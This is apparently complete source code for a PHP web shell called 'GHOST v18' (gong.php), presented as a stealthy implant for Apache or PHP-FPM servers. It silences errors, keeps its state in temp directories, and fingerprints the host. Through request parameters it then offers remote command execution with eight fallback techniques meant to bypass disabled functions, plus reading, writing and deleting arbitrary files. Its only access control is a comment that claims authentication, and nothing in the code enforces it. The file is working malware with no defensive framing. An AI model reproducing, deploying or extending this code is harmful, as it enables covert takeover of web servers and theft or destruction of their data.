<?php
// language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
// GHOST v18 - section 0: bootstrap, environment probe, fallback engine.
// loaded via loader.php (tmp include). no persistent file in webroot.
// all state in tmpdir. silent on failure. monolithic prefix: gh_

// ==== CONSTANTS =============================================================
define('GH_VER',      '18.0.0-s0');
define('GH_TAG',      'gong');
define('GH_STATE_DIR', gh_state_dir());
define('GH_STATE_FILE', GH_STATE_DIR . '/gh_state_' . md5(__FILE__) . '.json');
define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');

// ==== BOOTSTRAP =============================================================
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);
if (function_exists('ob_start')) @ob_start();

// ==== HELPERS ===============================================================
function gh_state_dir() {
    $c = array();
    if (function_exists('sys_get_temp_dir')) $c[] = @sys_get_temp_dir();
    $ut = @ini_get('upload_tmp_dir'); if (is_string($ut) && $ut !== '') $c[] = $ut;
    $c[] = @getcwd();
    foreach ($c as $d) {
        if (!is_string($d) || $d === '' || !@is_dir($d) || !@is_writable($d)) continue;
        return rtrim($d, '/\\');
    }
    return '/tmp';
}

function gh_log($msg) {
    if (!defined('GH_LOG_FILE')) return;
    $f = GH_LOG_FILE;
    if (@is_file($f) && @filesize($f) > 1048576) @rename($f, $f . '.1');
    @file_put_contents($f, '[' . date('c') . '] ' . $msg . "\n", FILE_APPEND | LOCK_EX);
}

function gh_json($data, $code = 200) {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) {
        @header('Content-Type: application/json; charset=utf-8');
        @header('X-Powered-By: ');
        @http_response_code($code);
    }
    echo @json_encode($data);
    exit;
}

function gh_plain($text, $code = 200) {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) {
        @header('Content-Type: text/plain; charset=utf-8');
        @header('X-Powered-By: ');
        @http_response_code($code);
    }
    echo $text;
    exit;
}

function gh_disabled_list() {
    $s = (string)@ini_get('disable_functions');
    if ($s === '') return array();
    $out = array();
    foreach (@explode(',', $s) as $f) { $f = @trim($f); if ($f !== '') $out[] = @strtolower($f); }
    return $out;
}

function gh_can($fn) {
    $fn = @strtolower($fn);
    if (in_array($fn, gh_disabled_list(), true)) return false;
    return function_exists($fn);
}

function gh_open_basedir() {
    $v = (string)@ini_get('open_basedir');
    return $v === '' ? array() : @array_filter(@array_map('trim', @explode(PATH_SEPARATOR, $v)));
}

function gh_has_open_basedir() { return count(gh_open_basedir()) > 0; }

function gh_tmpdir() {
    $t = @sys_get_temp_dir();
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    $t = @ini_get('upload_tmp_dir');
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    $t = @getcwd();
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    return null;
}

// ==== ENV PROBE =============================================================
function gh_env() {
    $e = array(
        'gh_ver'         => GH_VER,
        'php_version'    => @phpversion(),
        'php_sapi'       => @php_sapi_name(),
        'php_os'         => @php_uname('s') . ' ' . @php_uname('r'),
        'php_arch'       => @php_uname('m'),
        'user'           => gh_can('posix_getpwuid') && gh_can('posix_geteuid')
                            ? (string)@posix_getpwuid(@posix_geteuid())['name']
                            : (string)@get_current_user(),
        'cwd'            => @getcwd(),
        'doc_root'       => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',
        'script'         => isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '',
        'http_host'      => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '',
        'server_soft'    => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '',
        'remote_addr'    => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '',
        'tmpdir'         => gh_tmpdir(),
        'state_dir'      => GH_STATE_DIR,
        'disabled'       => gh_disabled_list(),
        'open_basedir'   => gh_open_basedir(),
        'loaded_ext'     => @get_loaded_extensions(),
        'uid'            => gh_can('posix_geteuid') ? @posix_geteuid() : null,
        'gid'            => gh_can('posix_getegid') ? @posix_getegid() : null,
        'groups'         => gh_can('posix_getgroups') ? @posix_getgroups() : array(),
        'can'            => array(
            'exec'   => gh_can_exec(),
            'read'   => gh_can_read(),
            'write'  => gh_can_write(),
            'eval'   => gh_can('eval'),
            'curl'   => gh_can('curl_init'),
            'fopen'  => gh_can('fopen'),
            'pdo'    => gh_can('pdo_drivers'),
            'mysqli' => gh_can('mysqli_connect'),
        ),
    );
    return $e;
}

function gh_can_exec() {
    foreach (array('system','passthru','shell_exec','exec','popen','proc_open','pcntl_exec') as $f) {
        if (gh_can($f)) return $f;
    }
    // backtick always available as language construct, but disable_functions can block via shell_exec
    return null;
}

function gh_can_read() {
    foreach (array('file_get_contents','fopen','readfile','file') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}

function gh_can_write() {
    foreach (array('file_put_contents','fopen','fwrite') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}

// ==== ENGINE: EXEC ==========================================================
// multi-tier command execution. tries each method until one returns non-null.
// returns array('out' => string, 'tier' => string) on success, array('out' => null, 'tier' => null, 'err' => string) on total failure.
function gh_exec($cmd, $timeout = 10) {
    if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);

    // wrap with timeout binary if available
    $wrapped = 'timeout ' . (int)$timeout . ' sh -c ' . @escapeshellarg($cmd) . ' 2>&1';

    // tier 1: system
    if (gh_can('system')) {
        @ob_start();
        @system($wrapped);
        $out = @ob_get_clean();
        if (is_string($out)) return array('out' => $out, 'tier' => 'system', 'err' => null);
    }
    // tier 2: passthru
    if (gh_can('passthru')) {
        @ob_start();
        @passthru($wrapped);
        $out = @ob_get_clean();
        if (is_string($out)) return array('out' => $out, 'tier' => 'passthru', 'err' => null);
    }
    // tier 3: shell_exec
    if (gh_can('shell_exec')) {
        $out = @shell_exec($wrapped);
        if (is_string($out)) return array('out' => $out, 'tier' => 'shell_exec', 'err' => null);
    }
    // tier 4: exec (line array)
    if (gh_can('exec')) {
        $lines = array();
        @exec($wrapped, $lines);
        if (is_array($lines) && count($lines) > 0) return array('out' => implode("\n", $lines), 'tier' => 'exec', 'err' => null);
    }
    // tier 5: popen
    if (gh_can('popen')) {
        $h = @popen($wrapped, 'r');
        if (is_resource($h)) {
            $out = '';
            while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $out .= $chunk; }
            @pclose($h);
            return array('out' => $out, 'tier' => 'popen', 'err' => null);
        }
    }
    // tier 6: proc_open
    if (gh_can('proc_open')) {
        $desc = array(1 => array('pipe','w'), 2 => array('pipe','w'));
        $h = @proc_open($wrapped, $desc, $pipes);
        if (is_resource($h)) {
            @stream_set_blocking($pipes[1], false);
            @stream_set_blocking($pipes[2], false);
            $out = '';
            $start = @time();
            while (true) {
                $out .= (string)@stream_get_contents($pipes[1]);
                $out .= (string)@stream_get_contents($pipes[2]);
                $st = @proc_get_status($h);
                if (!is_array($st) || !$st['running']) break;
                if ((@time() - $start) > ($timeout + 2)) { @proc_terminate($h, 9); break; }
                @usleep(50000);
            }
            @fclose($pipes[1]); @fclose($pipes[2]);
            @proc_close($h);
            return array('out' => $out, 'tier' => 'proc_open', 'err' => null);
        }
    }
    // tier 7: pcntl_exec via fork
    if (gh_can('pcntl_exec') && gh_can('pcntl_fork')) {
        $out_file = (gh_tmpdir() ?: '/tmp') . '/gh_pc_' . @md5(@uniqid('', true)) . '.out';
        $pid = @pcntl_fork();
        if ($pid === 0) {
            @pcntl_exec('/bin/sh', array('-c', $wrapped . ' > ' . @escapeshellarg($out_file) . ' 2>&1'));
            @posix_kill(@posix_getpid(), 9);
        } elseif ($pid > 0) {
            @pcntl_waitpid($pid, $st);
            $out = @is_file($out_file) ? (string)@file_get_contents($out_file) : '';
            @unlink($out_file);
            return array('out' => $out, 'tier' => 'pcntl_exec', 'err' => null);
        }
    }
    // tier 8: backtick (language construct, not function)
    $out = @`$wrapped`;
    if (is_string($out)) return array('out' => $out, 'tier' => 'backtick', 'err' => null);

    return array('out' => null, 'tier' => null, 'err' => 'all exec tiers failed');
}

// ==== ENGINE: READ ==========================================================
function gh_read($path, $max = 5242880) {
    if (!is_string($path) || $path === '') return null;
    if (!@is_file($path)) return null;
    $sz = @filesize($path);
    if ($sz !== false && $sz > $max) return array('err' => 'file too large', 'size' => $sz, 'max' => $max);

    // tier 1: file_get_contents
    if (gh_can('file_get_contents')) {
        $d = @file_get_contents($path);
        if (is_string($d)) return $d;
    }
    // tier 2: fopen + fread
    if (gh_can('fopen') && gh_can('fread')) {
        $h = @fopen($path, 'rb');
        if (is_resource($h)) {
            $d = '';
            while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $d .= $chunk; }
            @fclose($h);
            if (is_string($d)) return $d;
        }
    }
    // tier 3: readfile (output buffered)
    if (gh_can('readfile')) {
        @ob_start();
        @readfile($path);
        $d = @ob_get_clean();
        if (is_string($d)) return $d;
    }
    // tier 4: file() lines
    if (gh_can('file')) {
        $lines = @file($path);
        if (is_array($lines)) return @implode('', $lines);
    }
    // tier 5: shell fallback
    $r = gh_exec('cat ' . @escapeshellarg($path));
    if (is_string($r['out']) && $r['out'] !== '') return $r['out'];
    $r = gh_exec('head -c ' . (int)$max . ' ' . @escapeshellarg($path));
    if (is_string($r['out'])) return $r['out'];
    return null;
}

// ==== ENGINE: WRITE =========================================================
function gh_write($path, $data, $append = false) {
    if (!is_string($path) || $path === '' || !is_string($data)) return false;
    $flags = $append ? (FILE_APPEND | LOCK_EX) : LOCK_EX;

    // tier 1: file_put_contents
    if (gh_can('file_put_contents')) {
        $n = @file_put_contents($path, $data, $flags);
        if ($n !== false) return true;
    }
    // tier 2: fopen + fwrite
    if (gh_can('fopen') && gh_can('fwrite')) {
        $h = @fopen($path, $append ? 'ab' : 'wb');
        if (is_resource($h)) {
            $n = @fwrite($h, $data);
            @fclose($h);
            if ($n !== false) return true;
        }
    }
    // tier 3: shell redirection
    if ($append) {
        $cmd = 'printf %s ' . @escapeshellarg($data) . ' >> ' . @escapeshellarg($path);
    } else {
        $cmd = 'printf %s ' . @escapeshellarg($data) . ' > ' . @escapeshellarg($path);
    }
    $r = gh_exec($cmd);
    return (is_string($r['out']) && $r['tier'] !== null);
}

// ==== ENGINE: DELETE ========================================================
function gh_del($path) {
    if (!is_string($path) || $path === '') return false;
    if (gh_can('unlink')) {
        if (@unlink($path)) return true;
    }
    $r = gh_exec('rm -f ' . @escapeshellarg($path));
    return (is_string($r['out']) && $r['tier'] !== null);
}

// ==== PING ==================================================================
function gh_ping() {
    return array(
        'ok'      => true,
        'tag'     => GH_TAG,
        'ver'     => GH_VER,
        'ts'      => @time(),
        'env'     => gh_env(),
    );
}

// ==== ROUTER (section 0) ====================================================
function gh_router() {
    $act = isset($_POST['act']) ? (string)$_POST['act'] : (isset($_GET['act']) ? (string)$_GET['act'] : '');

    if ($act === '') {
        // status page (minimal html) - no info leaked unless authenticated
        @header('Content-Type: text/html; charset=utf-8');
        @header('X-Powered-By: ');
        echo '<!doctype html><html><head><meta charset="utf-8"><title>gh</title></head><body>';
        echo '<pre style="font:12px monospace;background:#0a0a0a;color:#0f0;padding:16px">';
        echo "GHOST v18 / section 0\n";
        echo "tag: " . GH_TAG . "\n";
        echo "ver: " . GH_VER . "\n";
        echo "php: " . @phpversion() . "\n";
        echo "sapi: " . @php_sapi_name() . "\n";
        echo "exec: " . (gh_can_exec() ?: 'BLOCKED') . "\n";
        echo "read: " . (gh_can_read() ?: 'BLOCKED') . "\n";
        echo "write: " . (gh_can_write() ?: 'BLOCKED') . "\n";
        echo "tmp: " . gh_tmpdir() . "\n";
        echo "open_basedir: " . (gh_has_open_basedir() ? 'ON' : 'OFF') . "\n";
        echo "disabled: " . count(gh_disabled_list()) . "\n";
        echo '</pre></body></html>';
        exit;
    }

    // dispatch
    try {
        switch ($act) {
            case 'ping':   gh_json(gh_ping()); break;
            case 'env':    gh_json(gh_env()); break;
            case 'exec':   $c = isset($_POST['cmd']) ? (string)$_POST['cmd'] : ''; gh_json(gh_exec($c)); break;
            case 'read':   $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = gh_read($p); gh_json(array('path' => $p, 'content' => $d)); break;
            case 'write':  $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = isset($_POST['data']) ? (string)$_POST['data'] : ''; $ap = !empty($_POST['append']); gh_json(array('path' => $p, 'ok' => gh_write($p, $d, $ap))); break;
            case 'delete': $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; gh_json(array('path' => $p, 'ok' => gh_del($p))); break;
            default:       gh_json(array('err' => 'unknown act', 'act' => $act), 400); break;
        }
    } catch (Throwable $e) {
        gh_log('router throw: ' . $e->getMessage());
        gh_json(array('err' => 'internal', 'msg' => $e->getMessage()), 500);
    }
}

// ==== ENTRY =================================================================
// only run router if loaded as entry (via loader include or direct). guard against accidental re-entry.
if (!defined('GH_ENTRY_DONE')) {
    define('GH_ENTRY_DONE', true);
    gh_router();
}
